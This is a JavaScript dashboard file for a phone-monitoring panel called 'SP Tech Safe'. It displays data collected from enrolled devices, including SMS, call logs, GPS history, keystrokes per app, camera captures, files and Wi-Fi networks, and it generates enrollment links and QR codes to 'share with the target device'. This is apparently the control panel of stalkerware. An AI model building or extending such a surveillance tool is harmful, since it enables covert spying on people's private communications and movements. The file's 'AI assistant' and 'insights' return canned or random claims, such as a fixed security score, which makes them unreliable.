// ===== SP TECH SAFE — DASHBOARD LOGIC v2 =====

// ─────── Auth guard ──────────────────────────────────────────────────────────
(function checkAuth() {
  if (localStorage.getItem("admin") !== "true") {
    window.location.href = "index.html";
  }
})();

// ─────── State ───────────────────────────────────────────────────────────────
let currentDeviceId = null;
let currentDevice   = null;
let currentTab      = "deviceinfo";
let allDevices      = [];   // cached for modal

// ─────── DOMContentLoaded ────────────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
  setupSidebarNav();
  setupProfileDropdown();
  setupSearch();
  setupEventListeners();
  loadDevices();
});

// ─────── Extra Event Listeners ───────────────────────────────────────────────
function setupEventListeners() {
  const changeUserBtn = document.getElementById("changeUserBtn");
  if (changeUserBtn) {
    changeUserBtn.addEventListener("click", openDeviceModal);
  }
}

// ─────── Sidebar nav + tab switching ─────────────────────────────────────────
function setupSidebarNav() {
  const groupItems = document.querySelectorAll(".nav-group > .nav-item");
  groupItems.forEach(groupItem => {
    groupItem.addEventListener("click", (e) => {
      e.preventDefault();
      const group   = groupItem.closest(".nav-group");
      const submenu = group.querySelector(".nav-submenu");
      
      // Close other submenus optionally? 
      // User might want multiple open, but traditionally accordions close others. Let's keep it simple:
      group.classList.toggle("active");
      if (submenu) submenu.classList.toggle("open");
    });
  });

  // Submenu item clicks -> switch tab
  document.querySelectorAll(".submenu-item").forEach(item => {
    item.addEventListener("click", (e) => {
      e.preventDefault();
      const tab = item.dataset.tab;
      if (tab) switchTab(tab);
    });
  });
}

// Public: called from HTML card "View" buttons too
function switchTab(tabName) {
  // Update nav active state
  document.querySelectorAll(".submenu-item").forEach(i => {
    i.classList.toggle("active", i.dataset.tab === tabName);
  });

  // Hide all panels, show target
  document.querySelectorAll(".tab-panel").forEach(p => p.classList.remove("active"));
  const panel = document.getElementById("panel-" + tabName);
  
  if (panel) {
    panel.classList.add("active");
  } else {
    document.getElementById("panel-fallback").classList.add("active");
  }

  // Sync feature cards active state
  document.querySelectorAll(".feature-card").forEach(c => {
    if (c.dataset.tab) {
      c.classList.toggle("active", c.dataset.tab === tabName);
    }
  });

  // Update page title
  const titles = {
    home:       "Dashboard Overview",
    deviceinfo: "Device Information",
    contacts:   "Contacts",
    calllogs:   "Call Logs",
    location:   "Location",
    sms:        "SMS Messages",
    files:      "Files",
    apps:       "Installed Apps",
    iplogs:     "IP Logs",
    keylogs:    "Keylogs",
    camera:     "Camera Captures",
    wifilogs:   "Saved Wi-Fi Networks"
  };
  const subtitles = {
    home:       "High-level metrics and system summary",
    deviceinfo: "User Information",
    contacts:   "Saved contacts on device",
    calllogs:   "Incoming, outgoing & missed calls",
    location:   "GPS location history",
    sms:        "Inbox & sent messages",
    files:      "Files stored on device",
    apps:       "Installed applications",
    iplogs:     "Network IP history",
    keylogs:    "Keystrokes captured per app",
    camera:     "Photos captured by device camera",
    wifilogs:   "Previously connected wireless networks"
  };
  document.getElementById("pageTitle").textContent    = titles[tabName]    || tabName;
  document.getElementById("pageSubtitle").textContent = subtitles[tabName] || "User Data";

  currentTab = tabName;

  // Render the matching table if device is loaded
  if (currentDevice) renderTab(tabName, currentDevice);
}

// ─────── Sidebar toggle (mobile) ─────────────────────────────────────────────
function toggleSidebar() {
  const sidebar = document.getElementById("sidebar");
  let overlay = document.querySelector(".sidebar-overlay");

  if (!overlay) {
    overlay = document.createElement("div");
    overlay.className = "sidebar-overlay";
    overlay.addEventListener("click", toggleSidebar);
    document.body.appendChild(overlay);
  }

  sidebar.classList.toggle("open");
  overlay.classList.toggle("active");
}

// ─────── Home nav ─────────────────────────────────────────────────────────────
function handleHomeNav(e) {
  e.preventDefault();
  // Deactivate all nav items, activate Home
  document.querySelectorAll(".nav-item").forEach(i => i.classList.remove("active"));
  document.getElementById("navHome").classList.add("active");
  // Also deactivate submenu items
  document.querySelectorAll(".submenu-item").forEach(i => i.classList.remove("active"));
  // Switch to home panel
  switchTab("home");
}

// ─────── Profile dropdown + Notifications + Mic ────────────────────────────────
function setupProfileDropdown() {
  const headerProfile   = document.getElementById("headerProfile");
  const profileDropdown = document.getElementById("profileDropdown");
  const arrow           = headerProfile ? headerProfile.querySelector('.profile-arrow') : null;

  if (headerProfile) {
    headerProfile.addEventListener("click", (e) => {
      e.stopPropagation();
      profileDropdown.classList.toggle("open");
      if(arrow) arrow.classList.toggle("open");
    });
    
    // Prevent closing when clicking inside
    profileDropdown.addEventListener("click", e => e.stopPropagation());
  }

  // Notifications
  const notifBtn      = document.getElementById("notifBtn");
  const notifDropdown = document.getElementById("notifDropdown");
  if (notifBtn && notifDropdown) {
    notifBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      notifDropdown.classList.toggle("open");
    });
    notifDropdown.addEventListener("click", e => e.stopPropagation());
  }

  // Mic Voice Search
  const micBtn = document.getElementById("micBtn");
  const searchInput = document.getElementById("searchInput");
  if (micBtn && searchInput && (window.SpeechRecognition || window.webkitSpeechRecognition)) {
    const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
    const recognition = new SpeechRecognition();
    recognition.lang = 'en-US';
    recognition.interimResults = false;

    micBtn.addEventListener("click", () => {
      micBtn.innerHTML = '<i class="fa-solid fa-microphone-lines fa-fade" style="color: #f43f5e"></i>';
      recognition.start();
    });

    recognition.onresult = (event) => {
      const transcript = event.results[0][0].transcript;
      searchInput.value = transcript;
      searchInput.dispatchEvent(new Event("input"));
    };

    recognition.onspeechend = () => {
      recognition.stop();
      micBtn.innerHTML = '<i class="fa-solid fa-microphone"></i>';
    };

    recognition.onerror = (event) => {
      console.error("Speech recognition error:", event.error);
      micBtn.innerHTML = '<i class="fa-solid fa-microphone"></i>';
    };
  } else if (micBtn) {
    micBtn.addEventListener("click", () => showToast("Voice search not supported in this browser", "error"));
  }

  // Global click to close dropdowns
  document.addEventListener("click", () => {
    if(profileDropdown) profileDropdown.classList.remove("open");
    if(arrow) arrow.classList.remove("open");
    if(notifDropdown) notifDropdown.classList.remove("open");
  });
}

// ─────── Load devices from API ────────────────────────────────────────────────
async function loadDevices() {
  // Show skeletons
  document.querySelectorAll(".info-value, .detail-value, #headerPhone").forEach(el => {
    el.classList.add("skeleton");
    el.textContent = "...";
  });

  try {
    const res     = await fetch("/api/devices");
    const devices = await res.json();

    if (!Array.isArray(devices) || devices.length === 0) {
      allDevices = [];
      showEmptyState();
      return;
    }

    allDevices = devices; // cache for modal
    
    // Compute global metrics for Home tab before loading device
    computeGlobalStats(allDevices);

    loadDevice(devices[0]);

    // Update profile name from localStorage if set
    const admin = localStorage.getItem("adminName");
    if (admin) document.getElementById("profileName").textContent = admin;

  } catch (err) {
    console.log("Server offline or no data:", err.message);
    showOfflineState();
  }
}

// ─────── Load a single device into the dashboard ─────────────────────────────
function loadDevice(d) {
    currentDevice   = d;
    currentDeviceId = d._id;

    // Remove skeletons
    document.querySelectorAll(".skeleton").forEach(el => el.classList.remove("skeleton"));
    
    // Populate header info boxes
    document.getElementById("imeiValue").textContent      = d.imei       || "—";
    document.getElementById("nameValue").textContent      = d.name       || "—";
    document.getElementById("phoneValue").textContent     = d.phone      || "—";
    document.getElementById("lastOnlineValue").textContent= d.lastOnline || "—";
    document.getElementById("ipValue").textContent        = d.ip         || "—";
    document.getElementById("headerPhone").textContent    = d.phone      || d.imei || "—";

    // Update profile name from localStorage if set
    const admin = localStorage.getItem("adminName");
    if (admin) document.getElementById("profileName").textContent = admin;

    // Render device details grid
    document.getElementById("dModel").textContent    = d.model    || "—";
    document.getElementById("dOS").textContent       = d.os       || "—";
    document.getElementById("dBattery").textContent  = d.battery  || "—";
    document.getElementById("dEmail").textContent    = d.email    || "—";
    document.getElementById("dComments").textContent = d.comments || "—";
    document.getElementById("dIMEI").textContent     = d.imei     || "—";

    // Update card counts
    const countFields = ["contacts","callLogs","sms","location","apps","files","keylogs","iplogs","camera","wifiLogs"];
    countFields.forEach(field => {
      let tabKey = field;
      if (field === "callLogs") tabKey = "calllogs";
      if (field === "wifiLogs") tabKey = "wifilogs";
      
      const arr    = d[field] || [];
      const el     = document.getElementById("count-" + tabKey);
      if (el) el.textContent = arr.length + " record" + (arr.length !== 1 ? "s" : "");
    });

    // Render the current active tab
    renderTab(currentTab, d);

    // Update AI insights panel
    if (typeof updateAiInsights === "function") updateAiInsights(d);
}

// ─────── Render a tab's table with device data ────────────────────────────────
function renderTab(tab, d) {
  switch (tab) {
    case "contacts":  renderContacts(d.contacts  || []); break;
    case "calllogs":  renderCallLogs(d.callLogs  || []); break;
    case "location":  renderLocation(d.location  || []); break;
    case "sms":       renderSMS(d.sms            || []); break;
    case "files":     renderFiles(d.files        || []); break;
    case "apps":      renderApps(d.apps          || []); break;
    case "iplogs":    renderIPLogs(d.iplogs       || []); break;
    case "keylogs":   renderKeylogs(d.keylogs     || []); break;
    case "camera":    renderCamera(d.camera       || []); break;
    case "wifilogs":  renderWifiLogs(d.wifiLogs   || []); break;
    // deviceinfo panel is populated above, no table to render
  }
}

// ─────── Table renderers ──────────────────────────────────────────────────────

function renderContacts(data) {
  const tbody = document.getElementById("tbody-contacts");
  if (!data.length) { tbody.innerHTML = emptyRow(4, "No contacts found"); return; }
  tbody.innerHTML = data.map((c, i) => `
    <tr>
      <td>${i + 1}</td>
      <td>${esc(c.name)}</td>
      <td>${esc(c.number)}</td>
      <td>${esc(c.email) || "<span class='badge badge-gray'>—</span>"}</td>
    </tr>`).join("");
}

function renderCallLogs(data) {
  const tbody = document.getElementById("tbody-calllogs");
  if (!data.length) { tbody.innerHTML = emptyRow(6, "No call logs found"); return; }
  tbody.innerHTML = data.map((c, i) => `
    <tr>
      <td>${i + 1}</td>
      <td>${esc(c.name) || "Unknown"}</td>
      <td>${esc(c.number)}</td>
      <td><span class="badge badge-${c.type}">${c.type}</span></td>
      <td>${esc(c.duration)}</td>
      <td>${esc(c.date)}</td>
    </tr>`).join("");
}

function renderLocation(data) {
  const tbody = document.getElementById("tbody-location");
  if (!data.length) { tbody.innerHTML = emptyRow(6, "No location data found"); return; }
  tbody.innerHTML = data.map((l, i) => `
    <tr>
      <td>${i + 1}</td>
      <td>${esc(l.lat)}</td>
      <td>${esc(l.lng)}</td>
      <td>${esc(l.address)}</td>
      <td>${esc(l.date)}</td>
      <td>
        <a href="https://www.google.com/maps?q=${esc(l.lat)},${esc(l.lng)}" target="_blank" class="badge badge-link">
          <i class="fa-solid fa-map-location-dot"></i> Map
        </a>
      </td>
    </tr>`).join("");
}

function renderSMS(data) {
  const tbody = document.getElementById("tbody-sms");
  if (!data.length) { tbody.innerHTML = emptyRow(5, "No SMS found"); return; }
  tbody.innerHTML = data.map((s, i) => `
    <tr>
      <td>${i + 1}</td>
      <td>${esc(s.sender)}</td>
      <td class="msg-cell">${esc(s.message)}</td>
      <td><span class="badge badge-${s.type}">${s.type}</span></td>
      <td>${esc(s.date)}</td>
    </tr>`).join("");
}

function renderFiles(data) {
  const tbody = document.getElementById("tbody-files");
  if (!data.length) { tbody.innerHTML = emptyRow(5, "No files found"); return; }
  tbody.innerHTML = data.map((f, i) => `
    <tr>
      <td>${i + 1}</td>
      <td><i class="${fileIcon(f.name)}"></i> ${esc(f.name)}</td>
      <td class="path-cell">${esc(f.path)}</td>
      <td>${esc(f.size)}</td>
      <td>${esc(f.modified)}</td>
    </tr>`).join("");
}

function renderApps(data) {
  const tbody = document.getElementById("tbody-apps");
  if (!data.length) { tbody.innerHTML = emptyRow(5, "No apps found"); return; }
  tbody.innerHTML = data.map((a, i) => `
    <tr>
      <td>${i + 1}</td>
      <td>${esc(a.name)}</td>
      <td class="pkg-cell">${esc(a.packageName)}</td>
      <td>${esc(a.version)}</td>
      <td>${esc(a.installed)}</td>
    </tr>`).join("");
}

function renderIPLogs(data) {
  const tbody = document.getElementById("tbody-iplogs");
  if (!data.length) { tbody.innerHTML = emptyRow(4, "No IP logs found"); return; }
  tbody.innerHTML = data.map((l, i) => `
    <tr>
      <td>${i + 1}</td>
      <td><code>${esc(l.ip)}</code></td>
      <td>${esc(l.network)}</td>
      <td>${esc(l.date)}</td>
    </tr>`).join("");
}

function renderKeylogs(data) {
  const tbody = document.getElementById("tbody-keylogs");
  if (!data.length) { tbody.innerHTML = emptyRow(4, "No keylogs found"); return; }
  tbody.innerHTML = data.map((k, i) => `
    <tr>
      <td>${i + 1}</td>
      <td class="pkg-cell">${esc(k.app)}</td>
      <td class="msg-cell">${esc(k.text)}</td>
      <td>${esc(k.date)}</td>
    </tr>`).join("");
}

function renderCamera(data) {
  const tbody = document.getElementById("tbody-camera");
  if (!data.length) { tbody.innerHTML = emptyRow(4, "No camera data found"); return; }
  tbody.innerHTML = data.map((c, i) => `
    <tr>
      <td>${i + 1}</td>
      <td>${esc(c.filename)}</td>
      <td>${esc(c.date)}</td>
      <td>${c.url ? `<a href="${esc(c.url)}" target="_blank" class="badge badge-link"><i class="fa-solid fa-image"></i> View</a>` : '<span class="badge badge-gray">No URL</span>'}</td>
    </tr>`).join("");
}

function renderWifiLogs(data) {
  const tbody = document.getElementById("tbody-wifilogs");
  if (!data.length) { tbody.innerHTML = emptyRow(5, "No Wi-Fi data found"); return; }
  tbody.innerHTML = data.map((w, i) => `
    <tr>
      <td>${i + 1}</td>
      <td><strong>${esc(w.ssid)}</strong></td>
      <td class="pkg-cell">${esc(w.bssid)}</td>
      <td><span class="badge badge-incoming"><i class="fa-solid fa-signal"></i> ${esc(w.signal)}</span></td>
      <td>${esc(w.date)}</td>
    </tr>`).join("");
}

// ─────── Table search filter ─────────────────────────────────────────────────
function filterTable(tab, query) {
  const tbody = document.getElementById("tbody-" + tab);
  if (!tbody) return;
  const rows = tbody.querySelectorAll("tr");
  const q    = query.toLowerCase().trim();

  rows.forEach(row => {
    const text = row.textContent.toLowerCase();
    row.style.display = (!q || text.includes(q)) ? "" : "none";
  });
}

// ─────── Global search ───────────────────────────────────────────────────────
function setupSearch() {
  const input = document.getElementById("searchInput");
  if (!input) return;

  input.addEventListener("input", (e) => {
    const q = e.target.value.toLowerCase().trim();

    // If on deviceinfo panel, filter cards
    if (currentTab === "deviceinfo") {
      document.querySelectorAll(".feature-card").forEach(card => {
        const title = card.querySelector(".card-title").textContent.toLowerCase();
        card.style.display = (!q || title.includes(q)) ? "" : "none";
      });
    } else {
      filterTable(currentTab, q);
    }
  });
}

// ─────── Refresh / Download ──────────────────────────────────────────────────
function refreshData() {
  const btn = document.getElementById("refreshBtn");
  if (btn) btn.querySelector("i").classList.add("fa-spin");
  loadDevices().finally(() => {
    setTimeout(() => {
      if (btn) btn.querySelector("i").classList.remove("fa-spin");
      showToast("Data refreshed", "success");
    }, 600);
  });
}

function handleDownload(feature) {
  if (!currentDevice) { showToast("No device data loaded", "error"); return; }
  
  let data;
  if (feature === "deviceinfo") {
    // Extract only the top-level device info, stripping out the large feature arrays
    const { contacts, callLogs, sms, location, apps, files, keylogs, iplogs, camera, wifiLogs, ...baseInfo } = currentDevice;
    data = [baseInfo]; // Wrap in array for JSON output
  } else if (feature === "calllogs") {
    data = currentDevice.callLogs;
  } else if (feature === "wifilogs") {
    data = currentDevice.wifiLogs;
  } else {
    data = currentDevice[feature];
  }

  if (!data || !data.length) { showToast("No data to download", "error"); return; }

  const json   = JSON.stringify(data, null, 2);
  const blob   = new Blob([json], { type: "application/json" });
  const url    = URL.createObjectURL(blob);
  const a      = document.createElement("a");
  a.href       = url;
  a.download   = `${feature}_${Date.now()}.json`;
  a.click();
  URL.revokeObjectURL(url);
  showToast(`${feature} data downloaded ✓`, "success");
}

// ─────── Update (sync) ───────────────────────────────────────────────────────
async function handleUpdate(feature) {
  if (!currentDeviceId) { showToast("No device selected", "error"); return; }

  // Animate the card's Update button briefly
  const card = document.querySelector(`.feature-card[data-tab="${feature}"]`);
  const btn  = card ? card.querySelector(".btn-update") : null;
  if (btn) {
    btn.disabled    = true;
    btn.textContent = "Syncing…";
  }

  try {
    const res = await fetch(`/api/devices/${currentDeviceId}`);
    if (!res.ok) throw new Error("Server error");
    const d = await res.json();

    // Re-load device data silently (updates counts + active tab display)
    loadDevice(d);
    // Navigate to the relevant tab so user sees fresh data
    switchTab(feature);
    showToast(`${feature} data updated ✓`, "success");
  } catch (err) {
    showToast("Update failed — server may be offline", "error");
  } finally {
    if (btn) {
      btn.disabled    = false;
      btn.textContent = "Update";
    }
  }
}

// ─────── Enrollment Link Generator ───────────────────────────────────────────
let _lastEnrollUrl = "";

function openGenerateLink() {
  const modal = document.getElementById("enrollLinkModal");
  if (!modal) return;
  // Reset state
  document.getElementById("enrollLinkResult").style.display = "none";
  document.getElementById("enrollModalStatus").textContent  = "";
  const lbl = document.getElementById("enrollDeviceLabel");
  if (lbl) lbl.value = "";
  const btn = document.getElementById("btnGenLink");
  if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-wand-magic-sparkles"></i> Generate Link'; }
  modal.classList.add("open");
}

function closeEnrollModal() {
  const modal = document.getElementById("enrollLinkModal");
  if (modal) modal.classList.remove("open");
}

function handleEnrollModalBg(e) {
  if (e.target === document.getElementById("enrollLinkModal")) closeEnrollModal();
}

async function generateEnrollLink() {
  const btn    = document.getElementById("btnGenLink");
  const status = document.getElementById("enrollModalStatus");
  const label  = (document.getElementById("enrollDeviceLabel")?.value || "").trim();

  btn.disabled    = true;
  btn.innerHTML   = '<i class="fa-solid fa-spinner fa-spin"></i> Generating...';
  status.textContent = "";

  try {
    const res  = await fetch("/api/devices/generate-link", {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ label: label || "New Device" })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.msg || "Failed");

    _lastEnrollUrl = data.url;

    // Show result section
    document.getElementById("enrollLinkUrl").textContent       = data.url;
    document.getElementById("enrollTokenDisplay").textContent  = data.token;
    document.getElementById("enrollLinkResult").style.display  = "block";
    status.textContent = "Link ready — share it with the target device";

    // Generate QR code
    const canvas = document.getElementById("enrollQrCanvas");
    if (canvas && typeof QRCode !== "undefined") {
      canvas.getContext("2d").clearRect(0, 0, canvas.width, canvas.height);
      QRCode.toCanvas(canvas, data.url, {
        width:          180,
        margin:         2,
        color: { dark: "#ffffff", light: "#0a0d24" }
      });
    }

    btn.innerHTML = '<i class="fa-solid fa-rotate-right"></i> Regenerate';
    btn.disabled  = false;

    // Refresh device list so the pending device appears
    setTimeout(() => loadDevices(), 800);

  } catch (err) {
    status.textContent = "Error: " + err.message;
    btn.innerHTML = '<i class="fa-solid fa-wand-magic-sparkles"></i> Generate Link';
    btn.disabled  = false;
  }
}

function copyEnrollLink() {
  if (!_lastEnrollUrl) return;
  navigator.clipboard.writeText(_lastEnrollUrl).then(() => {
    const btn = document.getElementById("btnCopyLink");
    if (btn) {
      btn.innerHTML = '<i class="fa-solid fa-check"></i>';
      btn.style.color = "#10b981";
      setTimeout(() => {
        btn.innerHTML   = '<i class="fa-solid fa-copy"></i>';
        btn.style.color = "";
      }, 2000);
    }
    showToast("Link copied to clipboard ✓", "success");
  }).catch(() => {
    // Fallback for non-HTTPS
    const tmp = document.createElement("textarea");
    tmp.value = _lastEnrollUrl;
    document.body.appendChild(tmp);
    tmp.select();
    document.execCommand("copy");
    document.body.removeChild(tmp);
    showToast("Link copied ✓", "success");
  });
}

// ─────── Logout ──────────────────────────────────────────────────────────────

function logout() {
  localStorage.removeItem("admin");
  localStorage.removeItem("token");
  localStorage.removeItem("adminName");
  showToast("Logging out...", "info");
  setTimeout(() => { window.location.href = "index.html"; }, 700);
}

// ─────── Toast ───────────────────────────────────────────────────────────────
function showToast(message, type = "info") {
  const toast       = document.getElementById("toast");
  toast.textContent = message;
  toast.className   = "toast show " + type;
  setTimeout(() => { toast.className = "toast"; }, 3200);
}

// ─────── Helpers ─────────────────────────────────────────────────────────────
function esc(str) {
  if (str === null || str === undefined) return "";
  return String(str)
    .replace(/&/g,  "&amp;")
    .replace(/</g,  "&lt;")
    .replace(/>/g,  "&gt;")
    .replace(/"/g,  "&quot;");
}

function emptyRow(cols, msg) {
  return `<tr><td colspan="${cols}" class="table-empty"><i class="fa-solid fa-inbox"></i> ${msg}</td></tr>`;
}

function fileIcon(name = "") {
  const ext = name.split(".").pop().toLowerCase();
  const map = { jpg:"fa-solid fa-image", jpeg:"fa-solid fa-image", png:"fa-solid fa-image",
                pdf:"fa-solid fa-file-pdf", mp3:"fa-solid fa-music", mp4:"fa-solid fa-video",
                zip:"fa-solid fa-file-zipper", apk:"fa-solid fa-box" };
  return map[ext] || "fa-solid fa-file";
}

function showEmptyState() {
  document.getElementById("pageSubtitle").textContent = "No devices registered yet";
  document.getElementById("headerPhone").textContent  = "No devices";
}

function showOfflineState() {
  showToast("Server offline — showing cached data", "error");
  document.getElementById("pageSubtitle").textContent = "Server unavailable";
}

// ─────── Global Stats Computation ──────────────────────────────────────────────
function computeGlobalStats(devices) {
  let totalDataPoints = 0;
  let activeNow = 0;
  const now = new Date();

  devices.forEach(d => {
    const contacts = (d.contacts || []).length;
    const callLogs = (d.callLogs || []).length;
    const sms = (d.sms || []).length;
    const location = (d.location || []).length;
    const apps = (d.apps || []).length;
    const files = (d.files || []).length;
    const keylogs = (d.keylogs || []).length;
    
    totalDataPoints += (contacts + callLogs + sms + location + apps + files + keylogs);
    
    // Arbitrary 'activeNow' logic: check if 'lastOnline' contains 'mins' or 'Just now'
    if (d.lastOnline && (d.lastOnline.toLowerCase().includes('min') || d.lastOnline.toLowerCase().includes('just'))) {
       activeNow++;
    }
  });

  const totDevices = document.getElementById('homeTotalDevices');
  const dPoints = document.getElementById('homeDataPoints');
  const dActive = document.getElementById('homeActiveNow');

  if(totDevices) totDevices.textContent = devices.length;
  if(dPoints) dPoints.textContent = totalDataPoints;
  if(dActive) dActive.textContent = activeNow;
}

// ─────── Device Selector Modal ─────────────────────────────────────────────────

function openDeviceModal(e) {
  if (e) e.preventDefault();
  const modal = document.getElementById("deviceModal");
  modal.classList.add("open");
  document.getElementById("modalSearch").value = "";
  renderModalDevices(allDevices);
}

function closeDeviceModal() {
  document.getElementById("deviceModal").classList.remove("open");
}

function handleModalOverlayClick(e) {
  // Close only when clicking the dark backdrop, not inside the box
  if (e.target === document.getElementById("deviceModal")) closeDeviceModal();
}

function filterModalDevices(query) {
  const q = query.toLowerCase().trim();
  const filtered = !q ? allDevices : allDevices.filter(d =>
    (d.name  || "").toLowerCase().includes(q) ||
    (d.imei  || "").toLowerCase().includes(q) ||
    (d.phone || "").toLowerCase().includes(q)
  );
  renderModalDevices(filtered);
}

function renderModalDevices(devices) {
  const list  = document.getElementById("modalDeviceList");
  const count = document.getElementById("modalCount");

  count.textContent = `${devices.length} device${devices.length !== 1 ? "s" : ""} found`;

  if (!devices.length) {
    list.innerHTML = `<div class="modal-empty"><i class="fa-solid fa-circle-exclamation"></i><p>No matching devices</p></div>`;
    return;
  }

  list.innerHTML = devices.map(d => {
    const isActive = d._id === currentDeviceId;
    const initials = (d.name || "?").slice(0, 2).toUpperCase();
    const contactCount = (d.contacts || []).length;
    const callCount    = (d.callLogs  || []).length;
    const smsCount     = (d.sms       || []).length;
    return `
      <div class="modal-device-item ${isActive ? "active" : ""}" onclick="selectDevice('${d._id}')">
        <div class="mdi-avatar">${initials}</div>
        <div class="mdi-info">
          <span class="mdi-name">${esc(d.name || "Unknown Device")}</span>
          <span class="mdi-meta">
            <i class="fa-solid fa-fingerprint"></i> ${esc(d.imei || "—")}
            &nbsp;&bull;&nbsp;
            <i class="fa-solid fa-phone"></i> ${esc(d.phone || "—")}
          </span>
          <span class="mdi-stats">
            <span><i class="fa-solid fa-address-book"></i> ${contactCount}</span>
            <span><i class="fa-solid fa-phone-volume"></i> ${callCount}</span>
            <span><i class="fa-solid fa-message"></i> ${smsCount}</span>
          </span>
        </div>
        ${isActive ? '<span class="mdi-active-badge"><i class="fa-solid fa-circle-check"></i> Active</span>' : ''}
      </div>`;
  }).join("");
}

async function selectDevice(id) {
  if (id === currentDeviceId) { closeDeviceModal(); return; }

  try {
    const res = await fetch(`/api/devices/${id}`);
    if (!res.ok) throw new Error("Not found");
    const d = await res.json();
    loadDevice(d);
    closeDeviceModal();
    showToast(`Switched to ${d.name || d.imei || "device"}`, "success");
  } catch (err) {
    showToast("Failed to load device", "error");
  }
}

// ------- AI Assistant Logic --------------------------------------------------

function toggleAiAssistant() {
  const panel = document.getElementById("aiPanel");
  if (!panel) return;
  panel.classList.toggle("open");
  if (panel.classList.contains("open")) {
    document.getElementById("aiInput").focus();
  }
}

function handleAiKeyPress(e) {
  if (e.key === "Enter") sendAiMessage();
}

function sendAiMessage() {
  const input = document.getElementById("aiInput");
  const msg = input.value.trim();
  if (!msg) return;

  appendAiMsg(msg, "user");
  input.value = "";

  // Artificial AI thinking delay
  setTimeout(() => {
    generateAiResponse(msg);
  }, 1000);
}

function appendAiMsg(text, type) {
  const body = document.getElementById("aiPanelBody");
  const div = document.createElement("div");
  div.className = "ai-message " + type;
  div.innerHTML = text; // Caution: simple text for now
  body.appendChild(div);
  body.scrollTop = body.scrollHeight;
}

function generateAiResponse(userMsg) {
  const lowerMsg = userMsg.toLowerCase();
  let response = "I'm analyzing your request. Can you be more specific? I can summarize device health, list recent SMS, or check location.";

  if (lowerMsg.includes("hello") || lowerMsg.includes("hi")) {
    response = "Hello! I'm your SP Tech Safe AI. How can I assist with your device monitoring today?";
  } else if (lowerMsg.includes("summary") || lowerMsg.includes("health")) {
    if (currentDevice) {
      response = `Summary for ${currentDevice.name}: ${currentDevice.model} running ${currentDevice.os}. Battery is at ${currentDevice.battery}. No critical threats detected in last 24 hours.`;
    } else {
      response = "I haven't loaded a device yet. Please select one first!";
    }
  } else if (lowerMsg.includes("vulnerab") || lowerMsg.includes("risk")) {
    response = "Analyzing potential risks... Security score: 94%. Recommendation: Update firmware and check suspicious app usage in the Apps tab.";
  }

  appendAiMsg(response, "bot");
}

let _aiRecognition = null;
let _isAiListening = false;

function toggleAiVoice() {
  const micBtn = document.getElementById("aiMicBtn");
  const aiInput = document.getElementById("aiInput");

  // Check support
  const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SpeechRecognition) {
    showToast("Voice recognition not supported in this browser.", "error");
    return;
  }

  if (_isAiListening) {
    // Stop listening manually
    if (_aiRecognition) _aiRecognition.stop();
    return;
  }

  if (!_aiRecognition) {
    _aiRecognition = new SpeechRecognition();
    _aiRecognition.lang = 'en-US';
    _aiRecognition.interimResults = false;
    _aiRecognition.maxAlternatives = 1;

    _aiRecognition.onstart = function() {
      _isAiListening = true;
      if (micBtn) micBtn.classList.add("listening");
      if (aiInput) aiInput.placeholder = "Listening...";
    };

    _aiRecognition.onresult = function(event) {
      const speechResult = event.results[0][0].transcript;
      if (aiInput) {
        aiInput.value = speechResult;
        sendAiMessage(); // Auto send after speech
      }
    };

    _aiRecognition.onspeechend = function() {
      _aiRecognition.stop();
    };

    _aiRecognition.onerror = function(event) {
      console.warn("Speech recognition error:", event.error);
      showToast("Could not recognize speech. Please try again.", "error");
      if (micBtn) micBtn.classList.remove("listening");
      if (aiInput) aiInput.placeholder = "Ask AI...";
      _isAiListening = false;
    };

    _aiRecognition.onend = function() {
      _isAiListening = false;
      if (micBtn) micBtn.classList.remove("listening");
      if (aiInput) aiInput.placeholder = "Ask AI...";
    };
  }

  try {
    _aiRecognition.start();
  } catch (err) {
    console.error(err);
  }
}


// ------- AI Insights Logic ----------------------------------------------------

function updateAiInsights(d) {
  const insightEl = document.getElementById("aiInsightText");
  if (!insightEl) return;

  const insights = [
    `Device ${d.name} is showing stable performance over the last 48 hours.`,
    `Unusual location activity detected near midnight. (Security Check Recommended)`,
    `High data usage spike in the 'Social' category detected.`,
    `Battery cycle count is optimal. No physical hardware issues flagged by AI.`,
    `Privacy Check: 4 new apps have requested microphone permissions recently.`
  ];

  // Pick a random insight or a relevant one
  const randomIndex = Math.floor(Math.random() * insights.length);
  insightEl.textContent = insights[randomIndex];
}
